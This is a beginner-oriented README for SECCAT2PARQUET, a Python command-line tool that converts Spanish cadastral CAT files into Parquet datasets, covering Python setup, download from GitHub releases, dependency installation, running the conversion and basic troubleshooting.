# ⚙️ SECCAT2PARQUET - Convert Spanish CAT Files Simply

[![Download SECCAT2PARQUET](https://img.shields.io/badge/Download-SECCAT2PARQUET-blue?style=for-the-badge)](https://github.com/rafslazy/SECCAT2PARQUET/releases)

---

SECCAT2PARQUET is a command-line tool designed to convert Spanish cadastral CAT files into Parquet datasets. It makes handling large cadastral data files easier, faster, and more efficient for data analysis or storage. This guide helps you download, install, and use the tool even if you have no programming background.

---

## 🔍 What Is SECCAT2PARQUET?

SECCAT2PARQUET helps turn complex Spanish cadastral files (which contain property and land data) into Parquet files. Parquet is a modern file format used for big data because it compresses data efficiently and speeds up processing.

You can use this tool to:

- Transform raw cadastral data into easy-to-use files  
- Prepare data for business analysis or research  
- Get better storage and faster data access  
- Work with large files without slowing your computer  

You do not need to write any code. The tool runs through a simple command you enter in your computer terminal.

---

## 💻 System Requirements

Before installing SECCAT2PARQUET, check that your system meets these requirements:

- **Operating Systems:** Windows 10 or later, macOS 10.15 or later, Linux (Ubuntu 18.04+)  
- **Processor:** Intel or AMD processor with 64-bit support  
- **Memory:** At least 4 GB RAM (8 GB recommended for large files)  
- **Storage:** Minimum 100 MB free space for installation  
- **Software:** Python 3.8 or higher must be installed on your system  

If you are unsure whether Python is installed, this guide will help you check and install it.

---

## 🚀 Getting Started

Here are the main steps to get SECCAT2PARQUET ready on your computer and start converting files.

### Step 1: Check for Python

SECCAT2PARQUET runs using Python. To check if Python is installed:

- **Windows:**  
  1. Press `Win + R`, type `cmd`, and press Enter to open the Command Prompt.  
  2. Type `python --version` and press Enter.  
  3. If you see a version number like `Python 3.9.2`, Python is installed. If you get an error, proceed to install Python below.  

- **macOS/Linux:**  
  1. Open Terminal.  
  2. Type `python3 --version` and press Enter.  
  3. If a version number appears, Python is ready. Otherwise, install it.

### Step 2: Install Python (if needed)

1. Visit the official Python website: https://www.python.org/downloads/  
2. Download the latest version for your operating system.  
3. Run the installer and follow the instructions:  
   - On Windows, make sure to check "Add Python to PATH" before clicking install.  
   - On macOS, drag Python to the Applications folder as instructed.  
4. After installation, repeat Step 1 to check Python is correctly installed.

---

## 📥 Download & Install SECCAT2PARQUET

[![Download SECCAT2PARQUET](https://img.shields.io/badge/Download-SECCAT2PARQUET-blue?style=for-the-badge)](https://github.com/rafslazy/SECCAT2PARQUET/releases)

1. Visit the SECCAT2PARQUET release page by clicking the badge above or opening this link in your browser:  
   https://github.com/rafslazy/SECCAT2PARQUET/releases  
   
2. Look for the most recent version at the top of the page.  

3. Download the file suitable for your system. This will usually be a `.zip` archive or executable related to your operating system.  

4. Once downloaded, extract the zip file to a folder you can easily find (e.g., Desktop or Documents).  

5. Open a Command Prompt (Windows) or Terminal (macOS/Linux).  

6. Change to the folder where you extracted the files. Example:  
   ```
   cd Desktop/SECCAT2PARQUET
   ```  

7. The tool may require some Python packages. Usually, you can install these by running:  
   ```
   pip install -r requirements.txt
   ```
   If you get an error saying `pip` is not found, try `python -m pip install -r requirements.txt` or use `pip3`.

---

## ▶️ How to Run SECCAT2PARQUET

This tool works through commands you enter in your Command Prompt or Terminal.

### Step 1: Prepare your CAT file

Make sure you have the Spanish CAT file(s) you want to convert. These files typically end with `.cat` or similar formats.

Copy or move your CAT files to the same folder where SECCAT2PARQUET is installed. This makes it easier to run the conversion.

### Step 2: Open Command Prompt or Terminal

- Windows: Press `Win + R`, type `cmd` and press Enter  
- macOS/Linux: Open Terminal from your applications  

### Step 3: Run the conversion command

In the folder with SECCAT2PARQUET, enter the command below. Replace `<filename>` with the name of your CAT file.

```
python sec_cat_2_parquet.py <filename>.cat
```

For example, if your file is called `property_data.cat`, run:

```
python sec_cat_2_parquet.py property_data.cat
```

The tool will process the file and create a Parquet file in the same folder.

### Step 4: Check output

After the process finishes, you should see one or more new files ending with `.parquet`. These are your converted datasets.

You can open these files using data tools that support Parquet, or share them with others for data analysis.

---

## ⚙️ Additional Features

- **Batch Processing:** Use a command to convert multiple CAT files at once (check the full documentation for details).  
- **Streaming Support:** Handles very large files by processing data in parts to avoid memory issues.  
- **Python Integration:** Advanced users can incorporate this tool into their Python scripts or data workflows.  
- **Performance:** Uses optimized libraries like Pandas and PyArrow for fast data handling.  

---

## 🛠 Troubleshooting

If you run into problems, here are a few common fixes:

- **Python not found:** Ensure Python is installed and the command `python` or `python3` works in your terminal.  
- **Permission errors:** Make sure you have permission to run files in the folder you use. Try running as administrator (Windows) or using `sudo` on Linux/macOS.  
- **Missing Python packages:** Run `pip install -r requirements.txt` again to install any missing dependencies.  
- **File not found:** Double-check that the CAT file name is correct and that you are running the command in the folder containing the file.  

---

## 📚 Where to Learn More

For technical users or developers interested in the full capabilities, visit the project repository:  
https://github.com/rafslazy/SECCAT2PARQUET

Here you will find detailed documentation, source code, and support resources.

---

## 🙋 Need Help?

If you have questions or need assistance, consider:

- Reviewing the Issues tab on the GitHub page  
- Checking online forums about Python or Parquet files  
- Contacting support or community through the GitHub repository  

---

This guide aims to make converting Spanish cadastral CAT files accessible without technical skills. Follow each step carefully, and you will have your data ready for analysis in no time.